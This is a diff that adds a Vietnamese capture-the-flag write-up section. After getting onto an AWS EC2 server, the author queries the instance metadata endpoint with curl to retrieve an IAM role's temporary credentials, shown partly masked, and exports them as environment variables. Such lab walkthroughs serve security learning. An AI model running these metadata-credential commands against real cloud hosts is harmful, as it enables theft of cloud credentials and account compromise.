@@ -43,3 +43,40 @@ Sau khi kéo 2 file ssh key về mình chạy `chmod 600 id_rsa` và sau đó th
 
 Done, flag ở ngay trong thư mục ngoài luôn.
 
+## Meta-reality
+
+Từ bài trên mình đã vào được server, vì là ec2 của AWS thì mình sẽ tìm kiếm IAM role thông qua IMDS (Instance Metadata Service). Mình run câu lệnh sau:
+
+```
+curl http://169.254.169.254/latest/meta-data/
+```
+
+Sau khi chạy lệnh trên mình được kết quả sau
+
+![](https://raw.githubusercontent.com/KevinKien/KevinKien.github.io/refs/heads/main/assets/img/Meta-reality1.png)
+
+Từ đây mình có thể lấy được role name trong IAM/security-credentials với câu lệnh sau
+
+```
+curl http://169.254.169.254/latest/meta-data/iam/security-credentials
+```
+
+Sau khi lấy được role name thì mình get credentials
+
+![](https://raw.githubusercontent.com/KevinKien/KevinKien.github.io/refs/heads/main/assets/img/Meta-reality2.png)
+
+Sau đó mình gán vào biến trên hệ điều hành để dễ dàng call
+
+```
+webadmin@ip-10-0-0-9:~$ export AWS_ACCESS_KEY_ID=ASIA4Sxxxxxx
+webadmin@ip-10-0-0-9:~$ export AWS_SECRET_ACCESS_KEY=OYEw6HTm3Axxxxx
+webadmin@ip-10-0-0-9:~$ export AWS_SESSION_TOKEN=IQoJb3JpZ2xxxxxx
+```
+
+Mình chạy lệnh sau để thực hiện xem kỹ hơn về iam role `web01`
+
+![](https://raw.githubusercontent.com/KevinKien/KevinKien.github.io/refs/heads/main/assets/img/Meta-reality3.png)
+
+Lệnh trên thì mình lấy được account id là `864899859472`
+
+
